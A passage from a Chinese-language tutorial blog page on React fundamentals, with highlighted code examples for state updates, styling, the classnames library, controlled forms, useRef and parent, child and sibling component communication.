punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">// 2. 点击事件回调</span>  <span class="token keyword">const</span> <span class="token function-variable function">handleClick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">// 作用: </span>    <span class="token comment">// 1. 用传入的新值修改count</span>    <span class="token comment">// 2. 重新使用新的count渲染UI</span>    <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>handleClick<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-2-状态的修改规则"><a href="#6-2-状态的修改规则" class="headerlink" title="6.2 状态的修改规则"></a>6.2 状态的修改规则</h2><p>在React中状态被认为是只读的，我们应该始终<code>替换它而不是修改它</code>, 直接修改状态不能引发视图更新。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2017.39.41.png" style="zoom:50%;"><h2 id="6-3-修改对象的状态"><a href="#6-3-修改对象的状态" class="headerlink" title="6.3 修改对象的状态"></a>6.3 修改对象的状态</h2><p>对于对象类型的状态变量，应该始终给set方法一个<code>全新的对象</code> 来进行修改。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2017.50.21.png" style="zoom:50%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">handleClick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">// 直接修改 无法引发视图更新</span>    <span class="token comment">// count++</span>    <span class="token comment">// console.log(count)</span>    <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment">// 修改对象状态</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>form<span class="token punctuation">,</span> setForm<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'jack'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">changeForm</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">// 错误写法：直接修改</span>    <span class="token comment">// form.name = 'john'</span>    <span class="token comment">// 正确写法：setFrom 传入一个全新的对象</span>    <span class="token function">setForm</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      <span class="token operator">...</span>form<span class="token punctuation">,</span>      <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'john'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>handleClick<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>changeForm<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">修改form</span><span class="token punctuation">{</span>form<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="七、样式控制"><a href="#七、样式控制" class="headerlink" title="七、样式控制"></a>七、样式控制</h1><h2 id="7-1-行内样式（不推荐）"><a href="#7-1-行内样式（不推荐）" class="headerlink" title="7.1 行内样式（不推荐）"></a>7.1 行内样式（不推荐）</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2018.06.47.png" style="zoom:50%;"><h2 id="7-2-类名控制样式（单独css文件）"><a href="#7-2-类名控制样式（单独css文件）" class="headerlink" title="7.2 类名控制样式（单独css文件）"></a>7.2 类名控制样式（单独css文件）</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2018.07.23.png" style="zoom:50%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 导入样式</span><span class="token keyword">import</span> <span class="token string">'./index.css'</span><span class="token keyword">const</span> style <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token string">'red'</span><span class="token punctuation">,</span>  <span class="token literal-property property">fontSize</span><span class="token operator">:</span> <span class="token string">'50px'</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* 行内样式控制 */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>style<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is span</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* 通过class类名控制 */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>foo<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is class foo</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.foo</span> <span class="token punctuation">{</span>  <span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="八、classnames动态控制类名"><a href="#八、classnames动态控制类名" class="headerlink" title="八、classnames动态控制类名"></a>八、classnames动态控制类名</h1><h2 id="8-1-安装classnames库"><a href="#8-1-安装classnames库" class="headerlink" title="8.1 安装classnames库"></a>8.1 安装classnames库</h2><p>classnames是一个简单的JS库，可以非常方便的通过条件动态控制class类名的显示。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> classnames<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-2-使用"><a href="#8-2-使用" class="headerlink" title="8.2 使用"></a>8.2 使用</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2016.03.39.png" alt="原始的模版字符串方式" style="zoom:50%;"><p>问题：字符串的拼接方式不够直观，也容易出错。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2016.04.36.png" alt="调用classNames()函数" style="zoom:67%;"><h1 id="九、受控表单绑定"><a href="#九、受控表单绑定" class="headerlink" title="九、受控表单绑定"></a>九、受控表单绑定</h1><p>概念：使用React组件的状态（useState）控制表单的状态。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2017.11.25.png" style="zoom:50%;"><p>1）准备一个React状态值</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> <span class="token punctuation">[</span>value<span class="token punctuation">,</span> setValue<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）通过value属性绑定状态，通过onChange属性绑定状态同步的函数</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2017.13.58.png" style="zoom:50%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 受控绑定表单</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token comment">// 1. 声明一个react状态 - useState</span><span class="token comment">// 2. 核心绑定流程</span><span class="token comment">// 1. 通过value属性绑定react状态</span><span class="token comment">// 2. 绑定onChange事件 通过事件参数e拿到输入框最新的值 反向修改到react状态身上</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>value<span class="token punctuation">,</span> setValue<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span>        <span class="token attr-name">value</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>value<span class="token punctuation">}</span></span>        <span class="token attr-name">onChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setValue</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span></span>        <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="十、React获取DOM元素"><a href="#十、React获取DOM元素" class="headerlink" title="十、React获取DOM元素"></a>十、React获取DOM元素</h1><p>在 React 组件中获取/操作 DOM，需要使用 useRef React Hook钩子函数，分为两步：</p><ol><li>使用useRef创建 ref 对象，并与 JSX 绑定</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2018.12.21.png" style="zoom:40%;"><ol start="2"><li>在DOM可用时，通过 inputRef.current 拿到 DOM 对象</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2018.12.52.png" style="zoom:40%;"><h1 id="十一、组件通信"><a href="#十一、组件通信" class="headerlink" title="十一、组件通信"></a>十一、组件通信</h1><h2 id="11-1-组件通信的概念"><a href="#11-1-组件通信的概念" class="headerlink" title="11.1 组件通信的概念"></a>11.1 组件通信的概念</h2><p>概念：组件通信就是组件之间的数据传递，根据组件嵌套关系的不同，有不同的通信方法。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2017.41.28.png" alt="截屏2024-12-17 17.41.28" style="zoom:50%;"><h2 id="11-2-父子组件通信"><a href="#11-2-父子组件通信" class="headerlink" title="11.2 父子组件通信"></a>11.2 父子组件通信</h2><h3 id="11-2-1-父传子"><a href="#11-2-1-父传子" class="headerlink" title="11.2.1 父传子"></a>11.2.1 父传子</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2017.42.14.png" style="zoom:50%;"><p>实现步骤：</p><ol><li>父组件传递数据 - 在子组件标签上绑定属性。</li><li>子组件接收数据 - 子组件通过props参数接收数据。</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 父传子</span><span class="token comment">// 1. 父组件传递数据  子组件标签身上绑定属性</span><span class="token comment">// 2. 子组件接收数据  props的参数</span><span class="token keyword">function</span> <span class="token function">Son</span> <span class="token punctuation">(</span><span class="token parameter">props</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// props：对象里面包含了父组件传递过来的所有的数据</span>  <span class="token comment">// { name:'父组件中的数据'}</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is son, </span><span class="token punctuation">{</span>props<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token plain-text">, jsx: </span><span class="token punctuation">{</span>props<span class="token punctuation">.</span>child<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">'this is app name'</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Son</span></span>        <span class="token attr-name">name</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span>        <span class="token attr-name">age</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token number">18</span><span class="token punctuation">}</span></span>        <span class="token attr-name">isTrue</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token boolean">false</span><span class="token punctuation">}</span></span>        <span class="token attr-name">list</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token string">'vue'</span><span class="token punctuation">,</span> <span class="token string">'react'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>        <span class="token attr-name">obj</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'jack'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></span>        <span class="token attr-name">cb</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span>        <span class="token attr-name">child</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is span</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span></span>      <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>props说明</li></ul><ol><li>props可传递任意的数据</li></ol><p>​数字、字符串、布尔值、数组、对象、函数、JSX</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2017.56.22.png" style="zoom:50%;"><ol start="2"><li><p>props是只读对象</p><p>子组件只能读取props中的数据，不能直接进行修改, 父组件的数据只能由父组件修改</p></li><li><p>特殊的prop children</p></li></ol><p>​场景：当我们把内容嵌套在子组件标签中时，父组件会自动在名为children的prop属性中接收该内容.</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2018.08.02.png" style="zoom:50%;"><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2018.08.18.png" alt="截屏2024-12-17 18.08.18" style="zoom:50%;"><h2 id="11-3-子传父"><a href="#11-3-子传父" class="headerlink" title="11.3 子传父"></a>11.3 子传父</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-18%2017.59.10.png" style="zoom:50%;"><p>核心思路：在子组件中调用父组件中的函数并传递参数。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-18%2017.59.37.png" style="zoom:40%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 核心：在子组件中调用父组件中的函数并传递实参</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">function</span> <span class="token function">Son</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> onGetSonMsg <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// Son组件中的数据</span>  <span class="token keyword">const</span> sonMsg <span class="token operator">=</span> <span class="token string">'this is son msg'</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is Son      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">onGetSonMsg</span><span class="token punctuation">(</span>sonMsg<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">sendMsg</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>msg<span class="token punctuation">,</span> setMsg<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">getMsg</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token function">setMsg</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is App, </span><span class="token punctuation">{</span>msg<span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Son</span></span> <span class="token attr-name">onGetSonMsg</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>getMsg<span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11-4-兄弟组件通信"><a href="#11-4-兄弟组件通信" class="headerlink" title="11.4 兄弟组件通信"></a>11.4 兄弟组件通信</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-23%2017.43.25.png" style="zoom:50%;"><p>实现思路：借助“状态提升”机制，通过父组件进行兄弟组件之间的数据传递</p><ol><li>A组件先通过子传父的方式把数据传给父组件App</li><li>App拿到数据后通过父传子的方式再传递给B组件</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 1. 通过子传父 A -&gt; App</span><span class="token comment">// 2. 通过父传子 App -&gt; B</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">function</span> <span class="token constant">A</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> onGetAName <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// Son组件中的数据</span>  <span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">'this is A name'</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is A compnent,      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">onGetAName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">send</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">B</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> name <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is B compnent,      </span><span class="token punctuation">{</span>name<span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>name<span class="token punctuation">,</span> setName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">getAName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token function">setName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is App      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">A</span></span> <span class="token attr-name">onGetAName</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>getAName<span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">B</span></span> <span class="token attr-name">name</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" 